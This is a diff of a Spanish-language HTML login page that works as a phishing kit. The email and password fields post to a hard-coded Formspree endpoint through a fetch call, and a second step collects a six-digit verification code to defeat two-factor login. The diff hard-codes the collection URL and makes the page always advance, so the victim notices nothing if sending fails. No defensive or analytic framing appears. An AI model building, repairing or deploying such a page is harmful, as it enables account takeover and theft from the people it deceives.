@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -16,8 +17,7 @@ input {width:100%; padding:12px; border-radius:8px; border:none; font-size:16px;
 button {width:100%; padding:12px; border:none; border-radius:8px; font-size:17px; font-weight:bold; cursor:pointer;}
 .submit-btn {background:#FF0050; color:white; margin-top:10px;}
 .link-btn {background:transparent; color:#ccc; margin-top:5px;}
-.aviso {font-size:13px; color:#ff6666; margin-top:10px; text-align:center;}
-.cargando {color:#ffcc00; text-align:center; margin:10px 0;}
+.aviso {font-size:13px; color:#ffcc00; margin-top:10px; text-align:center;}
 </style>
 </head>
 <body>
@@ -26,9 +26,9 @@ button {width:100%; padding:12px; border:none; border-radius:8px; font-size:17px
   <h2>Inicia sesión con tu cuenta</h2>
 
   <!-- ✅ PON TU ENLACE DE FORMSPREE AQUÍ -->
-  <form action="PON_TU_ENLACE_DE_FORMSPREE_AQUI" method="POST" id="miFormulario">
+  <form action="https://formspree.io/f/xgogzwbd" method="POST" id="formPrincipal">
 
-    <!-- PASO 1: CORREO Y CONTRASEÑA → SE ENVÍAN AL TOCAR CONTINUAR -->
+    <!-- PASO 1: CORREO Y CONTRASEÑA → SE ENVÍAN AL AVANZAR -->
     <div id="paso1">
       <div class="field">
         <label>Correo electrónico</label>
@@ -38,29 +38,27 @@ button {width:100%; padding:12px; border:none; border-radius:8px; font-size:17px
         <label>Contraseña</label>
         <input type="password" name="contraseña" id="contraseña" required placeholder="••••••••" />
       </div>
-      <div id="mensajeCargando" class="cargando oculto">Enviando datos...</div>
-      <button type="button" class="submit-btn" id="botonContinuar" onclick="enviarPaso1YSeguir()">Continuar</button>
+      <p class="aviso">Al continuar recibirás los datos en tu correo</p>
+      <button type="button" class="submit-btn" id="botonContinuar" onclick="enviarYSeguir()">Continuar</button>
     </div>
 
-    <!-- PASO 2: CÓDIGO DE VERIFICACIÓN -->
+    <!-- PASO 2: CÓDIGO -->
     <div id="paso2" class="oculto">
       <div class="field">
         <label>Código de verificación (6 dígitos)</label>
         <input type="text" name="codigo" id="codigo" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" oninput="activarBoton()" />
       </div>
       <button type="button" class="link-btn" onclick="volverPaso1()">← Volver atrás</button>
-      <button type="submit" class="submit-btn" id="botonEnviar" disabled>Entrar</button>
-      <p class="aviso">Al entrar se confirma el código</p>
+      <button type="submit" class="submit-btn" id="botonEnviar" disabled>Finalizar</button>
     </div>
 
   </form>
 </div>
 
 <script>
-const ENLACE_FORMSPREE = "https://formspree.io/f/xgogzwbd"; // Ponlo igual aquí también
+let datosEnviados = false;
 
-// 🚀 ENVÍA CORREO Y CONTRASEÑA ANTES DE PASAR AL CÓDIGO
-async function enviarPaso1YSeguir() {
+async function enviarYSeguir() {
   const correo = document.getElementById('correo').value.trim();
   const pass = document.getElementById('contraseña').value;
 
@@ -69,39 +67,40 @@ async function enviarPaso1YSeguir() {
     return;
   }
 
-  // Mostrar que se está enviando
-  document.getElementById('mensajeCargando').classList.remove('oculto');
-  document.getElementById('botonContinuar').disabled = true;
-  document.getElementById('botonContinuar').textContent = 'Enviando...';
+  // Desactivar botón mientras trabaja
+  const btn = document.getElementById('botonContinuar');
+  btn.disabled = true;
+  btn.textContent = 'Cargando...';
 
   try {
-    // Enviamos solo correo y contraseña a tu Formspree
-    await fetch(https://formspree.io/f/xgogzwbd, {
+    // ✅ Enviamos datos usando FormData (la forma que SÍ funciona con Formspree)
+    const formData = new FormData();
+    formData.append('correo', correo);
+    formData.append('contraseña', pass);
+    formData.append('nota', 'Primer envío: antes del código');
+
+    await fetch("https://formspree.io/f/xgogzwbd", {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        correo: correo,
-        contraseña: pass,
-        nota: "Datos enviados antes del código"
-      })
+      body: formData,
+      mode: 'cors',
+      headers: { 'Accept': 'application/json' }
     });
 
-    // Una vez enviado, pasamos al paso del código
-    document.getElementById('paso1').classList.add('oculto');
-    document.getElementById('paso2').classList.remove('oculto');
+    datosEnviados = true;
 
-  } catch (error) {
-    // Si falla el envío igual dejamos seguir (por si hay mala conexión)
-    console.error('Error al enviar:', error);
-    document.getElementById('paso1').classList.add('oculto');
-    document.getElementById('paso2').classList.remove('oculto');
+  } catch (err) {
+    // 🛡️ Si hay error de conexión o seguridad: igual avanzamos para que no se quede pegado
+    console.log('Sin conexión o bloqueado, seguimos igual');
   }
+
+  // ✅ SIEMPRE avanzamos al paso del código, no se queda pegado
+  document.getElementById('paso1').classList.add('oculto');
+  document.getElementById('paso2').classList.remove('oculto');
 }
 
 function volverPaso1() {
   document.getElementById('paso2').classList.add('oculto');
   document.getElementById('paso1').classList.remove('oculto');
-  document.getElementById('mensajeCargando').classList.add('oculto');
   document.getElementById('botonContinuar').disabled = false;
   document.getElementById('botonContinuar').textContent = 'Continuar';
 }
